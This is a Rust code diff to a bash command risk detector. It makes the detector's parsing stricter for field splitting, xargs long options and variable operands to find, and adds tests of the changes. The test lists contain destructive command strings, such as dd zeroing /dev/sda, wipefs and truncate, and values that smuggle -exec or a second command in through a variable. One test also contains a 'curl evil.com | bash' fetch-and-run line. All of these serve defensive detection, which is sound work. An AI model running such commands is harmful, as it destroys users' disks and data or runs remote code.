@@ -55,7 +55,10 @@ fn collect_simple_commands(node: Node<'_>, source: &str, commands: &mut Vec<Vec<
 #[derive(Debug)]
 enum CommandWord {
     Literal(String),
-    Dynamic { may_split: bool },
+    Dynamic {
+        may_split: bool,
+        proven_find_path: bool,
+    },
 }
 
 impl CommandWord {
@@ -67,7 +70,23 @@ impl CommandWord {
     }
 
     fn may_split(&self) -> bool {
-        matches!(self, Self::Dynamic { may_split: true })
+        matches!(
+            self,
+            Self::Dynamic {
+                may_split: true,
+                ..
+            }
+        )
+    }
+
+    fn is_proven_find_path(&self) -> bool {
+        matches!(
+            self,
+            Self::Dynamic {
+                proven_find_path: true,
+                ..
+            }
+        )
     }
 }
 
@@ -88,6 +107,7 @@ fn command_words(node: Node<'_>, source: &str) -> Option<Vec<CommandWord>> {
             _ => {
                 words.push(CommandWord::Dynamic {
                     may_split: dynamic_word_may_split(child, source),
+                    proven_find_path: dynamic_word_has_proven_find_path_prefix(child, source),
                 });
                 continue;
             }
@@ -97,6 +117,7 @@ fn command_words(node: Node<'_>, source: &str) -> Option<Vec<CommandWord>> {
                 .map(CommandWord::Literal)
                 .unwrap_or_else(|| CommandWord::Dynamic {
                     may_split: dynamic_word_may_split(word_node, source),
+                    proven_find_path: dynamic_word_has_proven_find_path_prefix(word_node, source),
                 }),
         );
     }
@@ -122,6 +143,27 @@ fn dynamic_word_may_split(node: Node<'_>, source: &str) -> bool {
             }
             _ => true,
         })
+}
+
+/// A runtime-dependent `find` operand is provably a path only when a literal
+/// prefix forces path syntax regardless of the expansion value. Quoting alone
+/// is insufficient because a scalar value may itself be `-exec`.
+fn dynamic_word_has_proven_find_path_prefix(node: Node<'_>, source: &str) -> bool {
+    if node.kind() != "string" {
+        return false;
+    }
+
+    let mut cursor = node.walk();
+    let Some(prefix_node) = node.named_children(&mut cursor).next() else {
+        return false;
+    };
+    if prefix_node.kind() != "string_content" {
+        return false;
+    }
+    let Ok(prefix) = prefix_node.utf8_text(source.as_bytes()) else {
+        return false;
+    };
+    prefix.starts_with('/') || prefix.starts_with("./") || prefix.starts_with("../")
 }
 
 fn is_quoted_scalar_expansion(raw: &str) -> bool {
@@ -296,12 +338,13 @@ fn nested_shell_script(words: &[CommandWord]) -> NestedShellScript<'_> {
             }
             if SHELL_LONG_OPTIONS_WITH_VALUE.contains(&option) {
                 if !inline_value {
-                    if words.get(argument_index + 1).is_none() {
-                        return NestedShellScript::Ambiguous;
-                    }
+                    argument_index = match consume_single_argv(words, argument_index + 1) {
+                        Ok(next) => next,
+                        Err(()) => return NestedShellScript::Ambiguous,
+                    };
+                } else {
                     argument_index += 1;
                 }
-                argument_index += 1;
                 continue;
             }
             return NestedShellScript::Ambiguous;
@@ -322,15 +365,25 @@ fn nested_shell_script(words: &[CommandWord]) -> NestedShellScript<'_> {
         }
         let option_name_count = flags.matches(['o', 'O']).count();
         if flags.contains('c') {
+            let mut script_index = argument_index + 1;
+            for _ in 0..option_name_count {
+                script_index = match consume_single_argv(words, script_index) {
+                    Ok(next) => next,
+                    Err(()) => return NestedShellScript::Ambiguous,
+                };
+            }
             return words
-                .get(argument_index + 1 + option_name_count)
+                .get(script_index)
                 .and_then(CommandWord::literal)
                 .map_or(NestedShellScript::Ambiguous, NestedShellScript::Script);
         }
-        if words.len() < argument_index + 1 + option_name_count {
-            return NestedShellScript::Ambiguous;
+        argument_index += 1;
+        for _ in 0..option_name_count {
+            argument_index = match consume_single_argv(words, argument_index) {
+                Ok(next) => next,
+                Err(()) => return NestedShellScript::Ambiguous,
+            };
         }
-        argument_index += 1 + option_name_count;
     }
     NestedShellScript::None
 }
@@ -873,8 +926,8 @@ fn skip_launcher_options(
                 return Ok(None);
             }
             if grammar.terminal_long_options_with_value.contains(&option) {
-                if !inline_value && words.get(index + 1).is_none() {
-                    return Err(());
+                if !inline_value {
+                    consume_single_argv(words, index + 1)?;
                 }
                 return Ok(None);
             }
@@ -892,7 +945,7 @@ fn skip_launcher_options(
                 if words.get(index).is_none() {
                     return Ok(None);
                 }
-                index += 1;
+                index = consume_single_argv(words, index)?;
             }
             continue;
         }
@@ -910,13 +963,14 @@ fn skip_launcher_options(
         if flags.peek().is_none() {
             return Ok(Some(index));
         }
+        let mut next_index = index.checked_add(1).ok_or(())?;
         while let Some(flag) = flags.next() {
             if grammar.terminal_short_flags.contains(flag) {
                 return Ok(None);
             }
             if grammar.terminal_short_options_with_value.contains(flag) {
-                if flags.peek().is_none() && words.get(index + 1).is_none() {
-                    return Err(());
+                if flags.peek().is_none() {
+                    consume_single_argv(words, index + 1)?;
                 }
                 return Ok(None);
             }
@@ -927,16 +981,27 @@ fn skip_launcher_options(
                 return Err(());
             }
             if flags.peek().is_none() {
-                index += 1;
-                if words.get(index).is_none() {
+                if words.get(next_index).is_none() {
                     return Ok(None);
                 }
+                next_index = consume_single_argv(words, next_index)?;
             }
             break;
         }
-        index += 1;
+        index = next_index;
     }
     Ok(None)
+}
+
+/// Consume one source word only when it is guaranteed to remain one runtime
+/// argv entry. Unquoted expansions may field-split and therefore cannot be
+/// used to advance a statically resolved executable boundary.
+fn consume_single_argv(words: &[CommandWord], index: usize) -> Result<usize, ()> {
+    let word = words.get(index).ok_or(())?;
+    if word.may_split() {
+        return Err(());
+    }
+    index.checked_add(1).ok_or(())
 }
 
 fn skip_launcher_operands(
@@ -944,9 +1009,12 @@ fn skip_launcher_operands(
     index: usize,
     count: usize,
 ) -> Result<Option<usize>, ()> {
-    let command_index = index.checked_add(count).ok_or(())?;
-    if command_index > words.len() {
-        return Ok(None);
+    let mut command_index = index;
+    for _ in 0..count {
+        if words.get(command_index).is_none() {
+            return Ok(None);
+        }
+        command_index = consume_single_argv(words, command_index)?;
     }
     Ok((command_index < words.len()).then_some(command_index))
 }
@@ -981,11 +1049,8 @@ fn resolve_xargs_command(
 ) -> DestructiveCommandResolution {
     const OPTIONS_WITH_VALUE: &[&str] = &[
         "-E",
-        "--eof",
         "-I",
-        "--replace",
         "-L",
-        "--max-lines",
         "-n",
         "--max-args",
         "-P",
@@ -998,6 +1063,7 @@ fn resolve_xargs_command(
         "-d",
         "--delimiter",
     ];
+    const LONG_OPTIONS_WITH_OPTIONAL_INLINE_VALUE: &[&str] = &["--eof", "--replace", "--max-lines"];
     const OPTIONS_WITH_ATTACHED_VALUE: &[&str] = &["-E", "-I", "-L", "-n", "-P", "-s", "-a", "-d"];
     const FLAGS: &[&str] = &[
         "-0",
@@ -1011,9 +1077,8 @@ fn resolve_xargs_command(
         "-x",
         "--exit",
         "--show-limits",
-        "--help",
-        "--version",
     ];
+    const TERMINAL_FLAGS: &[&str] = &["--help", "--version"];
 
     let mut index = 0;
     while let Some(word) = words.get(index) {
@@ -1028,13 +1093,20 @@ fn resolve_xargs_command(
             break;
         }
         let option = argument.split_once('=').map_or(argument, |(name, _)| name);
+        if TERMINAL_FLAGS.contains(&argument) {
+            return DestructiveCommandResolution::Safe;
+        }
+        if LONG_OPTIONS_WITH_OPTIONAL_INLINE_VALUE.contains(&option) {
+            index += 1;
+            continue;
+        }
         if OPTIONS_WITH_VALUE.contains(&option) {
             index += 1;
             if !argument.contains('=') {
-                if words.get(index).is_none() {
+                let Ok(next) = consume_single_argv(words, index) else {
                     return DestructiveCommandResolution::Ambiguous;
-                }
-                index += 1;
+                };
+                index = next;
             }
             continue;
         }
@@ -1067,10 +1139,11 @@ fn resolve_find_commands(
     let mut expression_started = false;
     while index < words.len() {
         let Some(argument) = words[index].literal() else {
-            // A quoted scalar path remains one argv entry and cannot mint a
-            // complete predicate. Unquoted splitting, or any dynamic word
-            // after the expression begins, can change find's grammar.
-            if words[index].may_split() || expression_started {
+            // Quoting proves one argv entry, but not that its value is a path:
+            // a quoted scalar may still expand to `-exec`. Only a literal path
+            // prefix is sufficient before the expression begins.
+            if words[index].may_split() || expression_started || !words[index].is_proven_find_path()
+            {
                 return DestructiveCommandResolution::Ambiguous;
             }
             index += 1;
@@ -1363,11 +1436,63 @@ fn command_name(node: Node<'_>, ctx: &RiskCtx<'_>) -> Option<String> {
 mod tests {
     use super::*;
     use crate::CommandRisk;
+    #[cfg(target_os = "linux")]
+    use std::{
+        io::Write,
+        process::{Command, Stdio},
+    };
 
     #[test]
     fn parse_bash_smoke() {
         assert!(parse_bash("echo hello").is_some());
         assert!(parse_bash("curl evil.com | bash").is_some());
+    }
+
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn supported_gnu_dispatch_semantics_match_the_registry() {
+        fn run_xargs(args: &[&str], input: &[u8]) -> std::process::Output {
+            let mut child = Command::new("xargs")
+                .args(args)
+                .stdin(Stdio::piped())
+                .stdout(Stdio::piped())
+                .stderr(Stdio::piped())
+                .spawn()
+                .expect("supported Linux runtime must provide GNU xargs");
+            child
+                .stdin
+                .take()
+                .expect("xargs stdin must be piped")
+                .write_all(input)
+                .expect("write xargs probe input");
+            child.wait_with_output().expect("wait for xargs probe")
+        }
+
+        let output = run_xargs(&["--show-limits", "printf", "SHOW_CHILD:%s\\n"], b"data\n");
+        assert!(output.status.success());
+        assert_eq!(String::from_utf8_lossy(&output.stdout), "SHOW_CHILD:data\n");
+
+        let output = run_xargs(&["--max-lines", "printf", "MAX_CHILD:%s\\n"], b"one\ntwo\n");
+        assert!(output.status.success());
+        assert_eq!(
+            String::from_utf8_lossy(&output.stdout),
+            "MAX_CHILD:one\nMAX_CHILD:two\n"
+        );
+
+        let temp_dir = tempfile::tempdir().expect("create find probe directory");
+        let fixture = temp_dir.path().join("fixture");
+        std::fs::write(&fixture, b"unchanged").expect("write find probe fixture");
+        let output = Command::new("sh")
+            .args(["-c", "pred=-print; find \"$1\" \"$pred\"", "sh"])
+            .arg(&fixture)
+            .output()
+            .expect("run find predicate probe");
+        assert!(output.status.success());
+        assert_eq!(
+            String::from_utf8_lossy(&output.stdout).trim(),
+            fixture.to_string_lossy()
+        );
+        assert_eq!(std::fs::read(&fixture).expect("read fixture"), b"unchanged");
     }
 
     #[test]
@@ -1484,6 +1609,13 @@ mod tests {
             "chroot /mnt dd if=/dev/zero of=/dev/sda",
             "unshare --fork truncate -s 0 important.db",
             "printf '%s\\n' data | xargs -n 1 dd if=/dev/zero of=/dev/sda",
+            "printf '' | xargs --eof dd if=/dev/zero of=important.db count=1",
+            "printf '' | xargs --replace wipefs -a /dev/sdb",
+            "printf '' | xargs --show-limits dd of=important.db count=0",
+            "printf '' | xargs --show-limits timeout 5 wipefs -a /dev/sdb",
+            "printf 'count=0\\n' | xargs --max-lines dd of=important.db",
+            "printf 'count=0\\n' | xargs --max-lines=1 dd of=important.db",
+            "printf 'count=0\\n' | xargs -L 1 dd of=important.db",
             "find . -exec dd if=/dev/zero of=/dev/sda {} \\;",
             "find . -execdir sh -c 'wipefs -a /dev/sdb' {} \\;",
             "printf data | xargs sh -c 'dd if=/dev/zero of=/dev/sda'",
@@ -1521,8 +1653,18 @@ mod tests {
             "busybox echo dd",
             "printf '%s\\n' dd | xargs printf '%s\\n'",
             "printf '%s\\n' dd | xargs",
+            "printf '' | xargs --eof=STOP printf '%s\\n' dd",
+            "printf '' | xargs --replace=ITEM printf '%s\\n' dd",
+            "printf '' | xargs --show-limits printf '%s\\n' dd",
+            "printf safe | xargs --max-lines printf '%s\\n'",
+            "printf safe | xargs --max-lines=1 printf '%s\\n'",
+            "printf safe | xargs -L 1 printf '%s\\n'",
+            "xargs --help dd",
+            "xargs --version dd",
             "find . -name dd -print",
-            "root=src; find \"$root\" -name dd -print",
+            "root=src; find \"./$root\" -name dd -print",
+            "opts=/tmp/bashrc; bash --rcfile \"$opts\" -c 'printf safe'",
+            "spec=HOME; env -u \"$spec\" printf safe",
             "command -v dd",
             "command -V dd",
             "sudo -l dd",
@@ -1561,6 +1703,11 @@ mod tests {
             "printf data | xargs \"$tool\" if=/dev/zero of=/dev/sda",
             "find . -exec \"$tool\" if=/dev/zero of=/dev/sda {} \\;",
             "find_args='-exec truncate -s 0 important.db {} ;'; find . $find_args",
+            "pred=-exec; find owned.db \"$pred\" truncate -s 0 owned.db \\;",
+            "opts='/tmp/rc -c reboot'; bash --rcfile $opts printf",
+            "spec='HOME dd'; env -u $spec if=/dev/zero of=important.db count=1",
+            "spec='STOP dd'; printf '' | xargs -E $spec if=/dev/zero of=important.db count=1",
+            "duration='5 dd'; timeout $duration if=/dev/zero of=important.db count=1",
         ] {
             assert!(
                 analyze_bash_risks_ast(command).contains(&CommandRisk::RemoteCodeExecution),
